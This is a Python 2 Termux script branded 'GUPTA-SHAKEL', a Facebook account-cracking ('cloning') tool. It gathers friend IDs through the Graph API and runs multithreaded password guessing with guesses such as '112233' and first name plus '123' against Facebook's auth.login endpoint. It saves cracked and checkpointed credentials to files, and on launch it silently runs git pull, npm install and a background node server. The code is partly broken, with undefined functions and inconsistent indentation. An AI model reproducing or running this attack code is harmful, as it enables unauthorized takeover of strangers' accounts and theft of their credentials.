#coding=utf-8

#!/usr/bin/python2

#decompile by star-vampire

try:

    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests

    from multiprocessing.pool import ThreadPool

except ImportError:

    os.system("pip2 install requests")

    os.system("python2 cracker.indirect")
    
os.system("clear")



if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):

    os.system("apt update && apt install nodejs -y")

from requests.exceptions import ConnectionError

os.system("git pull")

if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")

    os.system("cd ..... && pip install progress")

    os.system("cd ..... && npm install")

    os.system("cd ..... && node index.js &")

    os.system("clear")

    time.sleep(10)

elif os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")

    os.system("#")

    os.system("cd ..... && node index.js &")

    os.system("clear")

bd=random.randint(2e7, 3e7)

sim=random.randint(2e4, 4e4)

header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}

reload(sys)

sys.setdefaultencoding("utf-8")

c = "\033[1;92m"

c2 = "\033[0;97m"

c3 = "\033[1;91m"

logo ="""
\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;92mNigerian-Hackers\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮"""
print  "\033[1;90m👽 ●▬▬▬▬●�������������������GUPTA-SHAKEL�����������������●▬▬▬▬● 👽"
jalan("\033[0;31m👽👽👽👽👽👽👽👽") 
jalan("\033[0;32m★") 
jalan("\033[0;33m★★") 
jalan("\033[0;34m★★★") 
jalan("\033[0;31m●═════⚀●☆●☆●⚀══════●") 
jalan("\033[0;33m⚀") 
jalan("\033[1;35m⚀❍❍❖❍❍⚀") 
jalan("\033[0;37m☠ Welcome to GUPTA SHAKEL ☠   ") 
jalan("\033[0;37m⚀❍❍❖❍❍⚀") 
jalan("\033[0;35m★★★") 
jalan("\033[0;36m★★") 
jalan("\033[0;37m★") 
jalan("\033[0;96m👽👽👽👽👽👽👽") 
print "\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;92mNigerian Anonymous Hackers\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮"

print "\033[1;97m--------------------------------------------------------------"
print "\033[1;92m➣  Facebook : Mark Cornel"
print "\033[1;94m➣  Github   : https://github.com/GUPTA-SHAKEL"
print "\033[1;96m➣  Note     : Having Problem? Contact Me On WhatsApp:+2347013107449"
print "\033[1;99m➣  Disclamiar:: This Is For Educational Purpose Only."
print "\033[1;97m--------------------------------------------------------------"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
print """

▄︻┻═┳一𝘞𝘦𝘭𝘤𝘰𝘮𝘦 𝘵𝘰 𝘵𝘩𝘦 𝘍𝘢𝘴𝘵𝘦𝘴𝘵 𝘊𝘭𝘰𝘯𝘪𝘯𝘨 𝘌𝘷𝘦𝘳
▄︻┻═┳一🍑  🎀  𝐹𝒶𝓂🍬𝓊𝓈 𝓀𝒾𝓃𝑔  🎀  🍑
▄︻┻═┳一 🅶🆄🅿🆃🅰--🅲🅻🅾🅽🅴
        🐔  🎀  𝒲𝑒𝓁𝒸💗𝓂𝑒  🎀  🐔 """

CorrectUsername = "MEMO"
CorrectPassword = "KING"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97mEnter Username \x1b[1;97m: \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97mEnter Passcode \x1b[1;97m: \x1b[1;97m")
        if (password == CorrectPassword):
            print "\033[1;97mAccess Granted "#Dev:Gupta Shakel
	    time.sleep(1)
            loop = 'false'
        else:
            print "\033[1;97mACCESS DENIED"
            os.system('xdg-open https://www.facebook.com/profile.php?id=100046218699200')
    else:
        print "\033[1;97mACCESS DENIED"
        os.system('xdg-open https://www.facebook.com/profile.php?id=100046218699200')
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
     	
    print("")

    print("\033[0;97m[ Starting Main Menu ]").center(50)

    print("")

    print("\033[1;97m[1]\033[1;91m > \033[1;97mClone Public ID With b-api")

    print("")

    print("\033[1;97m[2]\033[1;91m > \033[1;97mMore Termux Command")

    print("")

    print("\033[1;97m[0]\033[1;91m > \033[1;97mlogout tool")

    print("")

    main_select()

def main_select():

    Abdullah = raw_input("\033[1;97m[!] Select --->\033[1;96m ")

    if Abdullah  =="1":

        login()

    if Abdullah =="2":

        os.system("xdg-open https://www.facebook.com/profile.php?id=100046218699200")

	main()  

    elif Abdullah =="0":

        os.system("exit")

    else:

        print("[!] Please select a valid option").center(50)

        time.sleep(2)

        main()

def login():

    os.system("clear")

    print logo

    print("")

    print("\033[0;97m[ Login Main Menu ]").center(50)

    print("")

    print("\033[1;97m[1]\033[1;91m > \033[1;97mlogin using token")

    print("")

    print("\033[1;97m[2]\033[1;91m > \033[1;97mlogin using password")

    print("")

    print("\033[1;97m[3]\033[1;91m > \033[1;97mMain menu back")

    print("")

    login_select()

def login_select():

    Abdullah = raw_input(" \033[1;97mOption :\033[1;96m ")

    if Abdullah =="1":

        os.system("clear")

        print logo

        print("")

	print("[ login with token ]").center(50)

	print("")

        token = raw_input("[!] Token ? \033[0;90m")

        token_s = open(".fb_token.txt","w")

        token_s.write(token)

        token_s.close()

        try:

            r = requests.get("https://graph.facebook.com/me?access_token="+token)

            q = json.loads(r.text)

            name = q["name"]

            nm = name.rsplit(" ")[0]

            print("")

            print("\033[1;92mYour token login successfully").center(50)

            time.sleep(1)

	    os.system("xdg-open https://www.facebook.com/profile.php?id=100046218699200")
	

	    time.sleep(1)

            menu()

        except (KeyError , IOError):

            print("")

            print("\033[1;91mToken invalid or account has checkpoint\033[0;97m").center(50)

            print("")

            time.sleep(2)

            login()

    elif Abdullah =="2":

        login_fb()

    elif Abdullah =="3":

        main()

    else:

        print("")

        print("Select a valid option").center(50)

        print("")

        login_select()

def login_fb():

	os.system("clear")

	print logo

	print("")

	print("[ login with password ]").center(50)

	print("")

        id = raw_input("[!] \033[1;93m Email/ID/Number :\033[1;97m ")

        id1 = id.replace(' ','')

        id2 = id1.replace('(','')

        uid = id2.replace(')','')

        pwd = raw_input("[!] \033[1;93m Passwor :\033[1;97m ")

        print("")

        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text

        q = json.loads(data)

        if "access_token" in q:

            login_s = open(".login.txt","w")

            login_s.write(q["access_token"])

            login_s.close()

            print("\t\033[1;92mLogin Successfull\033[0;97m")

            time.sleep(1)

            menu()

        else:

            if "www.facebook.com" in q["error_msg"]:

                print ("\n\033[1;91m[!] Login Failed . Account Has a Checkpoint\033[0;97m")

                time.sleep(1)

                login_fb()

            else:

                print("\n\033[1;91m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")

                time.sleep(1)

                login_fb()		



def menu():

    global token

    os.system("clear")

    print logo

    try:

        token = open(".fb_token.txt","r").read()

    except (KeyError , IOError):

        login()

    try:

        r = requests.get("https://graph.facebook.com/me?access_token="+token)

        q = json.loads(r.text)

        nm = q["name"]

        nmf = nm.rsplit(" ")[0]

        ok = nmf

    except (KeyError , IOError):

        print("")

        print("login account has checkpoint").center(50)

        print("")

        os.system("rm -rf .fb_token.txt")

        time.sleep(1)

        login()

	except requests.exceptions.ConnectionError:
		print"\x1b[1;97mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:Gupta Shakel
	print logo
	print "  \033[1;97m        ⚡ \033[1;97mLogged in User Info\033[1;97m ⚡"
	print "	   \033[1;97m Name\033[1;97m:\033[1;97m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;97m:\033[1;97m"+id+"\x1b[1;97m              "
	
	print "\033[1;97m---------------------------------------------------------"
		
	print "\033[1;97m✧\033[1;97m.\033[1;97m1.\x1b[1;97m Start Cloning..."
      
        
        print "\033[1;97m✧\033[1;97m.\033[1;97m2.\033[1;97m Follow Me On Facebook For Help"
        print "\033[1;97m✧\033[1;97m.\033[1;97m0.\033[1;97m Logout            "
        hop()

def hop():
	hack = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
	if hack =="":
		print "\x1b[1;97mFill in correctly"
		hop()
	elif hack =="1":
		super()
	elif hack =="2":
	        os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1')
	        menu()
        
	elif hack =="0":
		hamu('Token Removed')
		os.system('rm -rf login.txt')
		exit()
	else:
		print "\x1b[1;97mFill in correctly"
		hop()
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;97mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m✧ \033[1;97m1.\x1b[1;97mCrack From Friend List."
	print "\033[1;97m✧ \033[1;97m2.\x1b[1;97mCrack From Public ID."
	print "\033[1;97m✧ \033[1;97m0.\033[1;97mBack."
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
	if peak =="":
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m Please Wait"
		jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m≻\033[1;97mLink ID\033[1;37m: \033[1;97m")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
			super()
		print"\033[1;97m[✔] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
        
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	
	print "\033[1;97m[✔] Total Friends \033[1;97m: \033[1;97m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[✔] Cloning Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
        print"""
[!] To Stop Process Press CTRL Then Z

---------------------------------------------------------"""		
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Gupta Shakel
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = '112233'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;32m[Gupta-Ok]\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass1	
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass1	
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = '223344'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
						z = json.loads(x.text)
						print '\x1b[1;32mSuccessful\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass2	
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass2	
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								z = json.loads(x.text)
								print '\x1b[1;32m[Gupta-Ok]\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass3	
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass3	
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										z = json.loads(x.text)
										print '\x1b[1;32m[Gupta-Ok]\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass4	
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass4	
											cek = open("out/Checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
												z = json.loads(x.text)
												print '\x1b[1;32m[Gupta-Ok]\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass5	
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass5	
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '123456'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
														z = json.loads(x.text)
														print '\x1b[1;32m[Gupta-Ok]\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass6	
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass6	
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = '334455'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
																z = json.loads(x.text)
																print '\x1b[1;32m[Gupta-Ok]\x1b[1;32m \x1b[1;32m¦\x1b[1;32m ' + user + ' \x1b[1;32m¦\x1b[1;32m ' + pass7	
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;97m24 Hours\x1b[1;97m \x1b[1;97m¦\x1b[1;97m ' + user + ' \x1b[1;97m¦\x1b[1;97m ' + pass7	
																	cek = open("out/checkpoint.txt", "a")
                                                                                                                                        cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
															
		except:
			pass
		
	p = ThreadPool(50)
	p.map(main, id)
	print "\033[1;97m---------------------------------------------------"
	
	print '\033[1;97mProcess Has Been Completed.'
	print"\033[1;97m-----------------"
	print"\033[1;97mTotal OK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
	print "\033[1;97m---------------------------------------------------"
	
	
	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
	menu()

if __name__ == '__main__':
	login()
